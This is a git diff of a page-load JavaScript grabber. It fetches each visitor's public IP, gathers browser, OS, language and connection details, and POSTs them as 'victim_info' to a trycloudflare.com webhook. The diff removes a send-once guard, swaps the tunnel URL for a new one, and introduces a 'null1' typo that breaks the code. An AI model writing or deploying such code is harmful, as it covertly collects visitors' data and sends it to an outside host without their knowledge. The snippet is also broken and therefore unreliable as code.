@@ -4,8 +4,6 @@ document.addEventListener("DOMContentLoaded", function() {
     fetch('https://api.ipify.org')
         .then(response => response.text())
         .then(data => {
-            if (webhookSent) return;
-
             var userAgent = navigator.userAgent;
             let browser, browserVersion, os, version;
 
@@ -78,11 +76,11 @@ Language: ${userLanguage}
 Connection Type: ${connectionType}
 Loading Time: ${loadTime}`;
 
-            const webhookURL = "https://maternity-equivalent-hopes-mild.trycloudflare.com/userData";
+            const webhookURL = "https://terminology-britain-suspect-outlined.trycloudflare.com/userData";
 
             const payload = {
                 'victim_info': ipinfo, 
-                'extra_info': null
+                'extra_info': null1
             }
             fetch(webhookURL, {
                 method: "POST",
